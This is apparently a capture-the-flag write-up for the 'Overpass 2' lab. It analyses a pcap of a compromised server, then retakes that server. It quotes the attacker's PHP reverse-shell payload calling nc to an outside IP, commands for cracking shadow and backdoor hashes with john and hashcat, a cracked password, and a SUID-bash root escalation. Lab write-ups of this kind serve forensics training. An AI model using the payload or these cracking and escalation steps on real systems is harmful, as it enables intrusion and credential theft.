# Overpass 2

- Open the pcap file
- Export http objects 
- There is a file upload at `/development/upload.php`
- The payload was
`<?php exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.170.145 4242 >/tmp/f")?>`
- On analysing the `nc` commands using `folllow tcp stream` in wireshark found the attacker opened a `ssh backdoor` in the server.
- Use john the ripper to crack hashes in the `/etc/shadow` file with `fasttrack.txt` wordlist
```
john hash.txt --wordlist=/usr/share/wordlists/fasttrack.txt | tee john_crack.log
```
- Hash used in the backdoor
```
6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed
```
- Salt used for the hash
```
1c362db832f3f864c8c2fe05f2002a05
```
- Used hashcat to crack the password
```
hashcat -m 1710 "6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed:1c362db832f3f864c8c2fe05f2002a05" /usr/share/wordlists/rockyou.txt
```
- Cracked password: november16
- ssh into the server
- there is file named `.suid_bash` execute it as root to get the root access
```
./.suid_bash -p
```